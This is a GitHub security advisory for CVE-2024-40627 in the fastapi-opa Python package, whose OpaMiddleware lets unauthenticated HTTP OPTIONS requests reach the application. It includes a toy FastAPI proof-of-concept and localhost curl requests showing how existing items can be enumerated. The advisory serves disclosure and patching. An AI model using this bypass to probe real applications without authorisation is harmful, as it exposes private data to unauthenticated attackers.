# [M] OpaMiddleware does not filter HTTP OPTIONS requests

## Summary
Severity: Medium
Advisory: GHSA-5f5c-8rvc-j8wf
CVE: CVE-2024-40627
CWE: CWE-204
Ecosystem: PyPI
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:N/A:N (CVSS_V3)
Published: 2024-07-15
Source: https://github.com/advisories/GHSA-5f5c-8rvc-j8wf
Type: github-advisory

## Affected
- PyPI: `fastapi-opa` — affected >=0 <2.0.1

## Details
### Summary

HTTP `OPTIONS` requests are always allowed by `OpaMiddleware`, even when they lack authentication, and are passed through directly to the application.

The maintainer uncertain whether this should be classed as a "bug" or "security issue" – but is erring on the side of "security issue" as an application could reasonably assume OPA controls apply to *all* HTTP methods, and it bypasses more sophisticated policies.

### Details

`OpaMiddleware` allows all HTTP `OPTIONS` requests without evaluating it against any policy:

https://github.com/busykoala/fastapi-opa/blob/6dd6f8c87e908fe080784a74707f016f1422b58a/fastapi_opa/opa/opa_middleware.py#L79-L80

If an application provides different responses to HTTP `OPTIONS` requests based on an entity existing (such as to indicate whether an entity is writable on a system level), an unauthenticated attacker could discover which entities exist within an application (CWE-204).

### PoC

This toy application is based on the behaviour of an app[^1] which can use `fastapi-opa`. The app uses the `Allow` header of a HTTP `OPTIONS` to indicate whether an entity is writable on a "system" level, and returns HTTP 404 for unknown entities:

[^1]: an open source app, not written by me

```python
# Run with: fastapi dev opa-poc.py --port 9999
from fastapi import FastAPI, Response, HTTPException
from fastapi_opa import OPAConfig, OPAMiddleware
from fastapi_opa.auth.auth_api_key import APIKeyAuthentication, APIKeyConfig

# OPA doesn't actually need to be running for this example
opa_host = "http://localhost:8181"
api_key_config = APIKeyConfig(
    header_key = 'ApiKey',
    api_key = 'secret-key',
)
api_key_auth = APIKeyAuthentication(api_key_config)
opa_config = OPAConfig(authentication=api_key_auth, opa_host=opa_host)

app = FastAPI()
app.add_middleware(OPAMiddleware, config=opa_config)

WRITABLE_ITEMS = {
    1: True,
    2: False,
}


@app.get("/")
async def root() -> dict:
    return {"msg": "success"}

@app.get("/items/{item_id}")
async def read_item(item_id: int):
    if item_id not in WRITABLE_ITEMS:
        raise HTTPException(status_code=404)
    return {"item_id": item_id}

@app.options("/items/{item_id}")
async def read_item_options(response: Response, item_id: int) -> dict:
    if item_id not in WRITABLE_ITEMS:
        raise HTTPException(status_code=404)

    response.headers["Allow"] = "OPTIONS, GET" + (", POST" if WRITABLE_ITEMS[item_id] else "")
    return {}
```

As expected, HTTP `GET` requests fail consistently when unauthenticated, regardless of whether the entity exists, because `read_item()` is never executed:

```
$ curl -i 'http://localhost:9999/items/1'
HTTP/1.1 401 Unauthorized
server: uvicorn
content-length: 26
content-type: application/json

{"message":"Unauthorized"}

$ curl -i 'http://localhost:9999/items/3'
HTTP/1.1 401 Unauthorized
server: uvicorn
content-length: 26
content-type: application/json

{"message":"Unauthorized"}
```

However, HTTP `OPTIONS` requests are never authenticated by `OpaMiddleware`, so are passed straight through to `read_item_options()` and returned to unauthenticated users:

```
$ curl -i -X OPTIONS 'http://localhost:9999/items/1'
HTTP/1.1 200 OK
server: uvicorn
content-length: 2
content-type: application/json
allow: OPTIONS, GET, POST

{}

$ curl -i -X OPTIONS 'http://localhost:9999/items/2'
HTTP/1.1 200 OK
server: uvicorn
content-length: 2
content-type: application/json
allow: OPTIONS, GET

{}

$ curl -i -X OPTIONS 'http://localhost:9999/items/3'
HTTP/1.1 404 Not Found
server: uvicorn
content-length: 22
content-type: application/json

{"detail":"Not Found"}
```

### Versions

```
fastapi-opa==2.0.0
fastapi==0.111.0
```

## References
- https://github.com/busykoala/fastapi-opa/security/advisories/GHSA-5f5c-8rvc-j8wf
- https://nvd.nist.gov/vuln/detail/CVE-2024-40627
- https://github.com/busykoala/fastapi-opa/commit/9458845a6f6f414c0b79587fae83d7f14d74dfb4
- https://github.com/busykoala/fastapi-opa/commit/9588109ff651f7ffc92687129c4956126443fb8c
- https://github.com/busykoala/fastapi-opa
- https://github.com/busykoala/fastapi-opa/blob/6dd6f8c87e908fe080784a74707f016f1422b58a/fastapi_opa/opa/opa_middleware.py#L79-L80
